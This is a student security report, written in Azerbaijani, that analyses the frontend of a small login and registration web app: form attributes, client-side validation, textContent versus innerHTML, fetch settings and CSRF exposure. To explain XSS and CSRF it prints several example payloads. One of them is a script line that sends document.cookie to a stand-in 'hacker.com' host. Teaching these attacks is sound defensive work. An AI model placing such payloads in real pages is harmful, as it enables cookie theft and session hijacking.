# Bölmə 5 — Frontend Təhlükəsizlik Analizi

**Fənn:** Web Təhlükəsizliyi  
**Tələbə:** Mubariz Pashayev  
**Kurs:** II kurs  
**Tarix:** Aprel 2026

---

## 5.1 Frontend Təhlükəsizliyinin Əhəmiyyəti

Frontend — istifadəçinin birbaşa gördüyü və qarşılıqlı əlaqəyə girdiyi hissədir. Bu, həm də hakerin ilk toxunduğu səthi deməkdir. Brauzer developer tools (F12) ilə istənilən JavaScript kodu görünür, dəyişdirilə bilər, formalar manipulyasiya edilə bilər. Bu səbəbdən frontend təhlükəsizliyi həmişə backend ilə birlikdə qiymətləndirilir.

Frontend-dəki təhlükəsizlik tədbirləri iki məqsəd daşıyır:
1. **UX (istifadəçi təcrübəsi)** — istifadəçiyə tez və aydın geri bildiriş vermək
2. **İlk müdafiə xətti** — adi istifadəçi xətalarını dərhal tutmaq (amma hakeri dayandıra bilməz)

Bu layihədə frontend 3 HTML faylı, 1 JavaScript faylı və 1 CSS faylından ibarətdir.

---

## 5.2 HTML Formalarının Təhlükəsizlik Atributları

### 5.2.1 Login Forması

```html
<!-- frontend/login.html — 27-ci sətir -->
<form id="login-form" class="form-grid" novalidate>
```

`novalidate` atributu brauzerin daxili HTML5 doğrulamasını söndürür. Normalda `type="email"` istifadə etsəydik, brauzer özü e-poçt formatını yoxlayardı. Amma bu layihə `type="text"` istifadə edir və bütün doğrulamalar JavaScript-ə həvalə edilib. Bunun üstünlüyü — xəta mesajlarını tam idarə etmək və Azərbaycan dilində göstərmək mümkün olur.

E-poçt sahəsi:
```html
<!-- frontend/login.html — 30-38-ci sətir -->
<input
  type="text"
  id="login-email"
  name="email"
  autocomplete="email"
  inputmode="email"
  placeholder="nümunə@mail.com"
  maxlength="254"
/>
```

| Atribut | Dəyər | Təhlükəsizlik Əhəmiyyəti |
|---|---|---|
| `type="text"` | Mətn sahəsi | `type="email"` olsaydı brauzer doğrulayardı, amma layihə bunu JS ilə edir |
| `autocomplete="email"` | Brauzer əvvəlki e-poçtu təklif edir | Parol menecerləri ilə inteqrasiya — düzgün sahəni doldurur |
| `inputmode="email"` | Mobil cihazarda `@` olan klaviatura göstərir | UX üçündür, güvənlik yox |
| `maxlength="254"` | Maksimum 254 simvol | RFC 5321 standartı; çox uzun giriş bloklanır |

Parol sahəsi:
```html
<!-- frontend/login.html — 43-50-ci sətir -->
<input
  type="password"
  id="login-password"
  name="password"
  autocomplete="current-password"
  placeholder="****"
  maxlength="256"
/>
```

`type="password"` — bu atribut brauzərə bildirir ki, bu sahədəki məlumat həssasdır:
- Simvollar nöqtə (●●●●) ilə gizlədilir
- Bəzi brauzerlər bu sahəni clipboard tarixçəsinə yazmır
- Ekran paylaşımı zamanı görünməmə ehtimalı artır

`autocomplete="current-password"` — parol menecerlərinə "bu mövcud hesab üçün paroldur" siqnalını verir. Qeydiyyat formasında isə `autocomplete="new-password"` istifadə edilir ki, parol meneceri yeni unikal parol təklif etsin:

```html
<!-- frontend/register.html — 51-ci sətir -->
<input type="password" id="reg-password" name="password"
       autocomplete="new-password" placeholder="••••••••" maxlength="256" />
```

### 5.2.2 Register Forması — Terms Checkbox

```html
<!-- frontend/register.html — 58-64-cü sətir -->
<div class="form-group form-grid--full-width form-group--check">
  <div class="auth-check-row auth-check-row--legal">
    <input type="checkbox" id="reg-terms" class="auth-check-row__input" />
    <label for="reg-terms" class="auth-check-row__label">
      <a href="#terms" class="auth-inline-link">İstifadə şərtləri</a> ilə razıyam.
    </label>
  </div>
</div>
```

Bu checkbox JavaScript-də belə yoxlanılır:

```javascript
// frontend/auth.js — 219-223-cü sətir
if (termsReg && !termsReg.checked) {
  setAuthMsg("Davam etmək üçün şərtlərlə razılıq verin.", true);
  termsReg.focus();
  return;
}
```

Diqqət yetirək: bu yoxlama **yalnız frontend-dədir**. Backend-də terms checkbox yoxlanılmır. Haker JavaScript-i söndürüb və ya birbaşa API-yə sorğu göndərərək (Postman, curl ilə) terms olmadan qeydiyyatdan keçə bilər. Lakin bu, qanuni risk deyil — terms checkbox hüquqi məsələdir, texniki təhlükəsizliklə bağlı deyil.

### 5.2.3 Korporativ E-poçt Checkbox-u

Hər iki formada maraqlı bir checkbox var:

```html
<!-- frontend/login.html — 54-57-ci sətir -->
<input type="checkbox" id="auth-relaxed-email" class="auth-check-row__input" />
<label for="auth-relaxed-email" class="auth-check-row__label">
  Korporativ iş e-poçtu istifadə edirəm (şirkət domeni üzrə ünvan)
</label>
```

Bu checkbox yoxlandıqda e-poçt formatı validasiyası yumşaldılır — korporativ e-poçtlar bəzən standart formatdan fərqlənə bilər. JavaScript-də belə işləyir:

```javascript
// frontend/auth.js — 117-127-ci sətir
var genisFormat = relaxedEmail && relaxedEmail.checked;
var email = trim(inEmail.value);

if (!genisFormat && !emailDuzdur(email)) {
  // Standart format tələb edilir
  setAuthMsg("E-poçt düzgün deyil — nümunə@mail.com formatında olmalıdır.", true);
  return;
}
if (genisFormat && !email) {
  // Yalnız boş olmamaq tələb edilir
  setAuthMsg("E-poçt sahəsini doldurun.", true);
  return;
}
```

Bu, **UX kompromisidir** — bəzi real e-poçt formatlarını qəbul etmək üçün doğrulama zəiflədir. Lakin backend-də `validate_email()` hələ də işləyir. Haker bu checkbox-u istifadə edib zəif formatda e-poçt göndərsə belə, server tərəfdə yoxlanılacaq.

---

## 5.3 JavaScript Təhlükəsizlik Analizi (auth.js)

### 5.3.1 IIFE — Qlobal Ad Fəzasını Qorumaq

Bütün JavaScript kodu bir **IIFE** (Immediately Invoked Function Expression) içindədir:

```javascript
// frontend/auth.js — 3-cü və 264-cü sətir
(function () {
  // ... 260+ sətir kod burada ...
})();
```

Bu konstruksiya niyə istifadə edilir?

JavaScript-də `var` ilə yaradılan dəyişənlər əgər funksiya içində deyilsə, `window` obyektinə əlavə olunur — yəni qlobal (global scope) olur. Əgər səhifədə başqa script də `msgEl` adlı dəyişən yaratsa, ikisi bir-birini əzər.

IIFE ilə:
```javascript
// msgEl yalnız bu funksiya daxilində mövcuddur
// window.msgEl yoxdur
// başqa script-lər buna çata bilməz
var msgEl = document.getElementById("auth-message");
```

IIFE olmadan:
```javascript
// msgEl artıq window.msgEl olur
// haker konsolda window.msgEl ilə buna çatıb manipulyasiya edə bilər
var msgEl = document.getElementById("auth-message");
```

Təhlükəsizlik baxımından IIFE daxili dəyişənləri gizlədir — bu, **encapsulation** (kapsullaşdırma) prinsipinin tətbiqidir.

### 5.3.2 Client-Side E-poçt Doğrulaması

```javascript
// frontend/auth.js — 41-48-ci sətir
function emailDuzdur(email) {
  var e = trim(email);
  if (e.length < 5) return false;
  var at = e.indexOf("@");
  if (at < 1) return false;
  var dom = e.slice(at + 1);
  return dom.indexOf(".") >= 0;
}
```

Bu funksiya 3 şeyi yoxlayır:

1. **Uzunluq:** `e.length < 5` — ən qısa e-poçt `a@b.c` (5 simvol)
2. **@ simvolu:** `at < 1` — `@` olmalıdır VƏ ən azı 1 simvol ondan əvvəl olmalıdır. `@mail.com` rədd edilir (çünki `at` 0-dır, `0 < 1` doğrudur)
3. **Domain nöqtəsi:** `dom.indexOf(".") >= 0` — `@`-dən sonra nöqtə olmalıdır

Backend-dəki `validate_email` funksiyası ilə müqayisə edək:

```python
# backend/app.py — 79-83-cü sətir
def validate_email(email: str) -> bool:
    email = (email or "").strip()
    if len(email) < 5 or "@" not in email or "." not in email.split("@")[-1]:
        return False
    return True
```

Hər ikisi **eyni məntiqi** yoxlayır, amma fərqli dillərdə. Bu **Defense in Depth** (dərinlikli müdafiə) prinsipidir — haker JavaScript-i keçsə belə, eyni yoxlama serverdə onu gözləyir.

### 5.3.3 Client-Side Parol Gücü Yoxlaması

```javascript
// frontend/auth.js — 50-61-ci sətir
function parolQeydiyyat(pw) {
  if (!pw || pw.length < 8) return "Hesab parolu ən azı 8 simvol olmalıdır.";
  var herf = false;
  var reqem = false;
  for (var i = 0; i < pw.length; i++) {
    if (/[a-zA-ZəöüğışçƏÖÜĞİŞÇ]/.test(pw[i])) herf = true;
    if (/\d/.test(pw[i])) reqem = true;
  }
  if (!herf) return "Parolda ən azı bir hərf olmalıdır.";
  if (!reqem) return "Parolda ən azı bir rəqəm olmalıdır.";
  return "";
}
```

Maraqlı nöqtə: JavaScript versiyası Azərbaycan hərflərini (`əöüğışçƏÖÜĞİŞÇ`) regex-ə daxil edir. Python versiyası isə `c.isalpha()` istifadə edir ki, bu da Unicode hərfləri avtomatik tanıyır. Yəni hər iki tərəf Azərbaycan dili ilə düzgün işləyir.

Bu funksiya formanın göndərilməsindən əvvəl çağırılır:

```javascript
// frontend/auth.js — 224-230-cu sətir
var px = parolQeydiyyat(pw);
if (px) {
  setAuthMsg(px, true);
  inputXeta(rPw, true);
  rPw.focus();
  return;                // ← server-ə sorğu göndərilmir
}
```

`return` — funksiyanı dayandırır. Parol zəifdirsə, API-yə sorğu heç göndərilmir. Bu, lazımsız şəbəkə trafiki azaldır və serverə yük düşmür.

### 5.3.4 Real-Time Doğrulama (Input Event Listener)

İstifadəçi hər simvol yazarkən real vaxtda vizual geri bildiriş alır:

```javascript
// frontend/auth.js — 99-112-ci sətir
inEmail.addEventListener("input", function () {
  emailXetaLogin();
  emailHintYenile();
});
inEmail.addEventListener("blur", emailHintYenile);

inPw.addEventListener("input", function () {
  inputXeta(inPw, false);
});
```

`"input"` event-i hər simvol daxil edildikdə, `"blur"` event-i isə sahədən çıxarkən tetiklenir.

Vizual xəta göstərmə:
```javascript
// frontend/auth.js — 63-67-ci sətir
function inputXeta(el, gostar) {
  if (!el) return;
  if (gostar) el.classList.add("input-error");
  else el.classList.remove("input-error");
}
```

`input-error` CSS sinfi sahənin çərçivəsini qırmızı edir:

```css
/* frontend/style.css — 124-127-ci sətir */
.form-group input.input-error,
.form-group select.input-error {
  border-color: #dc2626 !important;
}
```

Bu, yalnız UX məqsədlidir — istifadəçi yanlış format daxil etdikdə dərhal bilsin. Güvənlik qorunması deyil.

### 5.3.5 Xəta Mesajlarının İdarəsi

```javascript
// frontend/auth.js — 8-17-ci sətir
function setAuthMsg(text, isError) {
  if (!msgEl) return;
  msgEl.textContent = text || "";
  if (!text) {
    msgEl.className = "form-msg form-grid--full-width";
    return;
  }
  msgEl.className =
    "form-msg form-grid--full-width is-visible " +
    (isError ? "form-msg--error" : "form-msg--ok");
}
```

Burada iki vacib təhlükəsizlik nöqtəsi var:

**1. `textContent` istifadə edilir, `innerHTML` yox!**

Bu, bu bölmənin ən mühüm təhlükəsizlik nöqtəsidir. Fərqi izah edək:

```javascript
// ✅ TƏHLÜKƏSİZ — bu layihədə istifadə edilir:
msgEl.textContent = text;
// "text" dəyişəni nə olursa olsun, düz mətn kimi göstərilir
// HTML tag-ları işlənmir, boyanmır, icra edilmir

// ❌ TƏHLÜKƏLİ — əgər belə yazılsaydı:
msgEl.innerHTML = text;
// "text" daxilindəki HTML tag-ları brauzər tərəfindən icra edilir
```

Nümunə üçün, əgər server xəta mesajında istifadəçinin adını qaytarsaydı və istifadəçi adını belə yazsaydı:

```
<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>
```

`textContent` ilə: istifadəçi ekranda bu mətni düz görür (heç bir kod icra edilmir)
`innerHTML` ilə: brauzer bu kodu **JavaScript kimi icra edir** — istifadəçinin cookie-si oğurlanır. Bu, **XSS (Cross-Site Scripting)** hücumu adlanır.

**2. `className` birbaşa təyin edilir, `classList.add` yox:**

```javascript
msgEl.className = "form-msg form-grid--full-width is-visible form-msg--error";
```

Bu, əvvəlki bütün sinifləri sıfırlar və yenilərini tətbiq edir. Əgər haker hansısa yolla əlavə CSS sinfi əlavə etsəydi (DOM manipulation ilə), bu sıfırlanma onu təmizləyər.

---

## 5.4 XSS (Cross-Site Scripting) Analizi

### 5.4.1 XSS Nədir?

XSS — haker başqa istifadəçinin brauzərində JavaScript kodu icra etdirə bildiyi hücum növüdür. OWASP Top 10-da A03 (Injection) kateqoriyasının bir hissəsidir.

XSS-in üç növü var:
- **Reflected XSS** — zərərli kod URL-dən və ya sorğudan geri əks olunur
- **Stored XSS** — zərərli kod bazada saxlanılır, digər istifadəçilərə göstərilir
- **DOM-based XSS** — zərərli kod JavaScript-in DOM manipulyasiyası ilə icra edilir

### 5.4.2 Bu Layihədə XSS Qorunması

Layihədə dinamik məzmun göstərən iki yer var:

**Yer 1: Xəta mesajları (auth.js)**
```javascript
// frontend/auth.js — 10-cu sətir
msgEl.textContent = text || "";
```
✅ Təhlükəsizdir — `textContent` HTML kimi render etmir.

**Yer 2: İstifadəçi adı (logged-in.html)**

```javascript
// frontend/logged-in.html — 46-cı sətir
info.textContent = (d.user.full_name || d.user.email) + " · " + d.user.email;
```
✅ Təhlükəsizdir — `textContent` istifadə edilir.

```javascript
// frontend/logged-in.html — 45-ci sətir
welcome.textContent = "Xoş gəldiniz";
```
✅ Sabit mətn, dinamik dəyər yoxdur.

**Lakin bir istisna var:**

```javascript
// frontend/logged-in.html — 42-ci sətir
info.innerHTML = '<a href="login.html">Giriş səhifəsi</a>';
```

Burada `innerHTML` istifadə edilir, amma daxilindəki mətn **sabit string-dir** — istifadəçi daxil etdiyi heç bir dəyər bu string-ə qarışmır. Bu, XSS riski yaratmır. Əgər belə olsaydı risk olardı:

```javascript
// ❌ TƏHLÜKƏLİ — bu layihədə BELƏ DEYİL:
info.innerHTML = '<p>Xoş gəldiniz, ' + d.user.full_name + '</p>';
// Əgər full_name = "<script>alert(1)</script>" olsa → XSS!
```

### 5.4.3 Bütün DOM Əməliyyatlarının Auditi

| Fayl | Sətir | Əməliyyat | Təhlükəsiz? | Səbəb |
|---|---|---|---|---|
| auth.js:10 | `msgEl.textContent = text` | Xəta mesajı | ✅ Bəli | textContent |
| logged-in.html:41 | `welcome.textContent = "Daxil deyilsiniz"` | Sabit mətn | ✅ Bəli | Sabit dəyər |
| logged-in.html:42 | `info.innerHTML = '<a href="login.html">...'` | Login linki | ✅ Bəli | Sabit HTML, dinamik dəyər yox |
| logged-in.html:45 | `welcome.textContent = "Xoş gəldiniz"` | Sabit mətn | ✅ Bəli | Sabit dəyər |
| logged-in.html:46 | `info.textContent = d.user.full_name + ...` | İstifadəçi adı | ✅ Bəli | textContent |
| logged-in.html:49 | `welcome.textContent = "Xəta"` | Sabit mətn | ✅ Bəli | Sabit dəyər |

Nəticə: Layihədə **XSS zəifliyi yoxdur**. Bütün dinamik məzmun `textContent` ilə göstərilir.

---

## 5.5 Fetch API və Şəbəkə Təhlükəsizliyi

### 5.5.1 fetchJsonApi Helper Funksiyası

Layihədə API sorğuları üçün xüsusi wrapper funksiya yazılıb:

```javascript
// frontend/auth.js — 23-39-cu sətir
function fetchJsonApi(url, options) {
  return fetch(url, options).then(function (r) {
    return r.text().then(function (text) {
      var data;
      if (text) {
        try {
          data = JSON.parse(text);
        } catch (e) {
          data = {
            ok: false,
            error: "Server cavabı gözlənilməzdir (HTTP " + r.status + ")."
          };
        }
      } else {
        data = {
          ok: false,
          error: "Boş cavab (HTTP " + r.status + ")."
        };
      }
      return { status: r.status, data: data };
    });
  });
}
```

Bu funksiya bir neçə təhlükəsizlik nöqtəsini həll edir:

**1. Xətayə davamlılıq:**
Server JSON əvəzinə xam HTML və ya boş cavab göndərərsə, standart `response.json()` istisna atardı və tətbiq çökərdi. Bu funksiya əvvəlcə `r.text()` ilə cavabı oxuyur, sonra `JSON.parse()` ilə çevirir. Əgər çevrilə bilmirsə — istifadəçiyə aydın mesaj göstərir.

**2. HTTP status kodunun saxlanması:**
`{ status: r.status, data: data }` — status kodu da qaytarılır. Bu, çağıran kodun status-a görə fərqli davranmasına imkan verir (məsələn, 401 = yanlış giriş, 503 = server boşdur).

**3. Boş cavab idarəetməsi:**
Əgər server heç nə qaytarmazsa (`text` boşdursa), əvvəl proqram çökmək əvəzinə adekvat xəta mesajı yaradılır.

### 5.5.2 Login Sorğusu

```javascript
// frontend/auth.js — 141-159-cu sətir
fetchJsonApi("/api/login", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  credentials: "same-origin",
  body: JSON.stringify({ email: email, password: pw }),
})
.then(function (res) {
  if (res.data.ok) {
    setAuthMsg(res.data.message || "Uğurlu.", false);
    setTimeout(function () {
      window.location.href = "logged-in.html";
    }, 500);
  } else {
    setAuthMsg(res.data.error || "Xəta", true);
  }
})
.catch(function () {
  setAuthMsg("Serverə qoşulmaq mümkün olmadı.", true);
});
```

Hər bir parametrin analizi:

**`method: "POST"`** — Verilər sorğunun body hissəsində göndərilir, URL-də yox. Əgər `GET` olsaydı:
```
GET /api/login?email=ali@mail.com&password=Sifre123 HTTP/1.1
```
Parol URL-də görünərdi — brauzer tarixçəsində, server loglarında, proxy-lərdə qeydə alınardı. POST bunu qarşısını alır.

**`headers: { "Content-Type": "application/json" }`** — Serverə deyir ki, body JSON formatındadır. Flask-da `request.get_json()` bu başlığa güvənir.

**`credentials: "same-origin"`** — Session cookie-nin sorğu ilə birlikdə göndərilməsini təmin edir. Bu olmadan Flask session-ı tanıya bilməzdi. `same-origin` dəyəri — cookie yalnız eyni domain-ə göndərilir. `include` olsaydı — cross-origin sorğularda da göndərilərdi, bu isə CSRF riskini artırar.

**`JSON.stringify({ email: email, password: pw })`** — JavaScript obyektini JSON stringə çevirir. Nəticə belə olur:
```json
{"email":"ali@mail.com","password":"Sifre123"}
```

**`setTimeout(function () { window.location.href = "logged-in.html"; }, 500)`** — Uğurlu girişdən 500 millisaniyə sonra istifadəçi hesab səhifəsinə yönləndirilir. Bu gecikməni istifadəçinin "Xoş gəldiniz!" mesajını görməsi üçündür.

**`.catch(function () { ... })`** — Şəbəkə xətası (server çöküb, internet kəsilib) halında istifadəçiyə mesaj göstərir. Bu olmadan xəta konsolda qalar, istifadəçi nə baş verdiyini bilməzdi.

### 5.5.3 Register Sorğusu

```javascript
// frontend/auth.js — 238-261-ci sətir
fetchJsonApi("/api/register", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  credentials: "same-origin",
  body: JSON.stringify({
    full_name: ad,
    email: email,
    password: pw,
    password_confirm: pw2,
  }),
})
.then(function (res) {
  if (res.data.ok) {
    setAuthMsg(res.data.message || "Oldu.", false);
    setTimeout(function () {
      window.location.href = "login.html";
    }, 800);
  } else {
    setAuthMsg(res.data.error || "Xəta", true);
  }
})
.catch(function () {
  setAuthMsg("Serverə qoşulmaq mümkün olmadı.", true);
});
```

Qeydiyyatda 4 sahə göndərilir: `full_name`, `email`, `password`, `password_confirm`. Uğurlu halda 800ms gecikdirmə ilə giriş səhifəsinə yönləndirilir (istifadəçinin "Qeydiyyat tamamlandı" mesajını oxuması üçün).

`password_confirm` sahəsi backend-də yenidən yoxlanılır:
```python
# backend/app.py — 170-171-ci sətir
if password != password2:
    return jsonify({"ok": False, "error": "Parollar üst-üstə düşmür."}), 400
```

---

## 5.6 Logged-in Səhifəsinin Analizi

```javascript
// frontend/logged-in.html — 34-56-cı sətir
(function () {
  var welcome = document.getElementById("welcome-line");
  var info = document.getElementById("user-info");

  // Cari istifadəçi məlumatını yoxla
  fetch("/api/me", { credentials: "same-origin" })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (!d.logged_in || !d.user) {
        welcome.textContent = "Daxil deyilsiniz";
        info.innerHTML = '<a href="login.html">Giriş səhifəsi</a>';
        return;
      }
      welcome.textContent = "Xoş gəldiniz";
      info.textContent =
        (d.user.full_name || d.user.email) + " · " + d.user.email;
    })
    .catch(function () {
      welcome.textContent = "Xəta";
    });

  // Çıxış düyməsi
  document.getElementById("btn-logout").addEventListener("click", function () {
    fetch("/api/logout", {
      method: "POST",
      credentials: "same-origin"
    }).then(function () {
      window.location.href = "login.html";
    });
  });
})();
```

Təhlükəsizlik baxımından diqqət çəkən nöqtələr:

**1. Səhifə server tərəfindən qorunmur:**
`logged-in.html` statik HTML faylıdır — hər kəs URL-ə birbaşa daxil ola bilər. Qorunma client-side-dədir: JavaScript `/api/me` sorğusu göndərir, əgər session yoxdursa "Daxil deyilsiniz" göstərir. Bu, **güvənlik baxımından ideal deyil** — həssas məlumat göstərən səhifələr server middleware ilə qorunmalıdır. Lakin bu layihədə həssas məlumat yoxdur (yalnız ad və e-poçt), buna görə qəbulediləcəkdir.

**2. `/api/me` endpointi ilə session yoxlaması:**
Real session yoxlaması server tərəfdə baş verir. JavaScript yalnız serverdən gələn cavaba əsasən ekranı mənalı şəkildə göstərir.

**3. Logout POST metodu ilə:**
```javascript
fetch("/api/logout", { method: "POST", credentials: "same-origin" })
```
Çıxış **POST** ilə edilir, GET ilə yox. Əgər GET olsaydı, haker istifadəçini `<img src="/api/logout">` olan səhifəyə çəkərək onun session-ını silə bilərdi (CSRF hücumu). POST ilə bu cəhd işləmir — brauzer `<img>` yükləyəndə yalnız GET istifadə edir.

---

## 5.7 CSS Təhlükəsizlik Nöqtələri

CSS-in özü birbaşa təhlükəsizlik riski yaratmır, amma aşağıdakılar qeyd edilməyə dəyər:

### 5.7.1 `.input-error` Vizual Geri Bildiriş

```css
/* frontend/style.css — 124-127-ci sətir */
.form-group input.input-error,
.form-group select.input-error {
  border-color: #dc2626 !important;
}
```

`!important` — digər CSS qaydalarını əzir. Bu, xəta çərçivəsinin həmişə görünməsini təmin edir. `!important` çox istifadə edilməsi pis praktikadır, amma bir-iki yerdə belə kritik vizual geri bildiriş üçün məqbuldur.

### 5.7.2 Xəta və Uğur Mesaj Stilləri

```css
/* frontend/style.css — 142-152-ci sətir */
.form-msg--error {
  background: #fef2f2;      /* açıq qırmızı fon    */
  color: #991b1b;            /* tünd qırmızı mətn   */
  border: 1px solid #fecaca; /* qırmızı çərçivə     */
}

.form-msg--ok {
  background: #f0fdf4;      /* açıq yaşıl fon      */
  color: #166534;            /* tünd yaşıl mətn     */
  border: 1px solid #bbf7d0; /* yaşıl çərçivə       */
}
```

Bu rənglər **accessibility (əlçatanlıq)** baxımından seçilib — kontrast nisbəti yüksəkdir. Yalnız rəngə güvənilmir — `is-visible` sinfi ilə mesajın görünüb-görünməməsi idarə edilir.

### 5.7.3 Arxa Plan Şəkli

```css
/* frontend/style.css — 26-ci sətir */
body {
  background-image: url("aviakassa-background.jpg");
  background-attachment: fixed;
}
```

`aviakassa-background.jpg` faylı `frontend/` qovluğundadır. Path traversal qorunması sayəsində bu fayl yalnız icazə verilmiş uzantılar siyahısında olduğu üçün brauzerdən əlçatandır (`.jpg` icazə siyahısındadır).

---

## 5.8 CSRF (Cross-Site Request Forgery) Riski

### 5.8.1 CSRF Nədir?

CSRF — haker istifadəçinin brauzərini istifadə edərək onun adından saxta sorğu göndərir. Belə senari:

1. Əli `aviakassa.com`-a daxil olur — session cookie brauzerində saxlanır
2. Əli başqa tab-da `hacker-site.com` açır
3. `hacker-site.com`-da gizli form var:
```html
<form action="http://aviakassa.com/api/logout" method="POST">
  <input type="submit" value="Pulsuz bilet qazan!" />
</form>
```
4. Əli düyməyə basır — brauzer `aviakassa.com`-a POST göndərir
5. Session cookie avtomatik əlavə olunur — server bunu real sorğu kimi qəbul edir
6. Əlinin session-ı silinir

Bu layihədə yalnız logout zarar görə bilər, amma daha mürəkkəb sistemlərdə CSRF ilə pul köçürmək, parol dəyişmək mümkündür.

### 5.8.2 Bu Layihədə CSRF Vəziyyəti

Bu layihədə **CSRF qorunması yoxdur**:
- CSRF token istifadə edilmir
- Cookie-lərdə `SameSite` atributu açıq şəkildə təyin edilməyib

Lakin bir müdafiə mexanizmi dolayı yolla mövcuddur:

```javascript
headers: { "Content-Type": "application/json" }
```

Backend yalnız JSON formatında sorğu qəbul edir (`request.get_json()`). HTML forması **`application/json`** content-type ilə sorğu göndərə bilmir — yalnız `application/x-www-form-urlencoded` və ya `multipart/form-data` göndərə bilər. Bu, HTML form əsaslı CSRF-i qismən bloklayır. Lakin haker JavaScript ilə (`XMLHttpRequest` və ya `fetch`) cross-origin sorğu göndərə bilər — bunu isə CORS qorunması bloklamalıdır.

---

## 5.9 Frontend Təhlükəsizlik Xülasəsi

### Güclü tərəflər:

| Mexanizm | Nə qoruyur |
|---|---|
| `textContent` istifadəsi | XSS hücumlarının qarşısını alır |
| IIFE kapsullaşdırma | Qlobal dəyişənlərin manipulyasiyasını çətinləşdirir |
| `credentials: "same-origin"` | Cookie-ləri yalnız eyni origin-ə göndərir |
| POST metodu ilə logout | GET logout CSRF riskini aradan qaldırır |
| JSON Content-Type | HTML form CSRF-i qismən bloklanır |
| Client + Server doğrulama | Defense in Depth prinsipi |
| `maxlength` HTML atributu | Çox uzun giriş cəhdlərini ilkin olaraq bloklanır |

### Zəif tərəflər və tövsiyələr:

| Məsələ | Risk | Tövsiyə |
|---|---|---|
| CSRF token yoxdur | Orta | Flask-WTF CSRF token əlavə et |
| `SameSite` cookie yoxdur | Orta | `SameSite=Strict` və ya `SameSite=Lax` əlavə et |
| `logged-in.html` server qorunması yoxdur | Aşağı | Server-side middleware ilə autentifikasiya yoxlaması əlavə et |
| Parol göstərmə/gizləmə düyməsi yoxdur | UX | Göz ikonu ilə `type` atributunu dəyişən düymə əlavə et |
| Loading state yoxdur | UX | Sorğu göndərilərkən düyməni disabled et — ikiqat klik qarşısını alır |

---

*Növbəti bölmədə aşkar edilmiş zəifliklər, OWASP Top 10 müqayisəsi və nəticə ətraflı araşdırılacaq.*
